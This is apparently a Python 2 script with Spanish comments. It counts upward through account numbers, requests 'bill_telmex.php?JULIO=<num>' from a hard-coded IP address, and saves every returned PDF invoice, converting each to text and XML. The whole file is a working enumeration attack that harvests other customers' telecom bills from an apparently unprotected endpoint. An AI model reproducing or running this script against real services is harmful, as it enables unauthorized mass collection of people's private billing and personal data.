import httplib
import sys
from pdfminer.pdfparser import PDFDocument, PDFParser
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter, process_pdf
from pdfminer.converter import XMLConverter, TextConverter
from pdfminer.layout import LAParams

#num=19430007
num = 42740985
while True:
    conection = httplib.HTTPConnection("190.27.201.2")
    conection.request("GET", "/bill_telmex.php?JULIO=" + str(num))
    response = conection.getresponse()
    rsrc = PDFResourceManager()
   
    
    if response.getheader('content-type') == 'application/pdf':
        print num
        
        #Guarde el pdf de la factura que acaba de hallar
        filename = "./facturas/" + str(num)
        fp = file(filename + ".pdf", 'w')
        fp.write(response.read())
        fp.close()
        
        fp = file(filename + ".pdf", 'rb')
        params = LAParams()
        params.word_margin = 2.0
        pagenos = set()
        pagenos.add(0)
        outfpxml = file(filename + ".xml", 'w') #Si vamos a producir el xml, hagamos el archivo de salida un xml
        outfptxt = file(filename + ".txt", 'w')#Si vamos a producir el text, hagamos el archivo de salida un txt
        devicexml = XMLConverter(rsrc, outfpxml, codec='utf-8', laparams=params) #Utilicemos el conversor a XML
        devicetxt = TextConverter(rsrc, outfptxt, codec='utf-8', laparams=params) #Utilicemos el conversor a Texto
        
        process_pdf(rsrc, devicetxt, fp, pagenos, maxpages=0, password='')
        process_pdf(rsrc, devicexml, fp, pagenos, maxpages=0, password='')
        
        #Cierre todos los flujos abiertos
        fp.close()
        devicexml.close()
        devicetxt.close()
        outfpxml.close()
        outfptxt.close()
    num = num + 1

